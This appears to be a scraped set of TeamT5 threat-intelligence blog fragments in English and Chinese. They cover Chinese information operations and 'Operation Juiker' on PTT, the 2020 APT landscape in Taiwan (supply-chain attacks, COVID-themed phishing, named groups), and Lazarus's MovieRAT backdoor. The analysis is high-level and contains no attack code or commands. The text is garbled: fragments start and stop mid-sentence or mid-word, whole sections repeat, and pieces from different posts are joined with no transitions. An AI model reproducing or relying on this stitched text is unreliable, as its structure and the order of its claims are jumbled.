more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat

是個輕量化的後門控制程式，支援最基本的檔案上傳/下載、指令執行及程序操作等功能。通常被駭客用於成功入侵後的第二階段控制（2nd-stage RAT）之用。先前所掌握的 MovieRAT 後門為 Windows 惡意程式，會透過 HTTP 通訊協定與中繼站連線，所使用的 Cookie 具有特定格式。\n\n根據 TeamT5 的情資，將 MovieRAT 定位到駭客組織 Lazarus 身上。Lazarus 為北韓的駭客族群，擁有多起攻擊金融產業的紀錄，尤其特別針對 SWIFT 跨國轉帳交易系統和 ATM 自動櫃員機系統進行攻擊。推測為了替北韓政權籌措資金，好發展武器與實驗，故多選擇金融產業和具有關鍵技術的私人企業進行攻擊。過往的攻擊行動中，會在惡意程式內參雜俄文，企圖混淆分析人員。近期則是開始大量入侵攻擊虛擬貨幣交易所，如 Bithumb、Youbit 及 Yapizon 等，造成上百萬美元的金額損失。\n\n##

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend. TeamT5 has a cyber threat intelligence (CTI) centered solution, [ThreatVision](https://teamt5.org/en/products/threatvision/), and we rely on a dedicated team of security experts to keep us steps ahead of threat actors.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 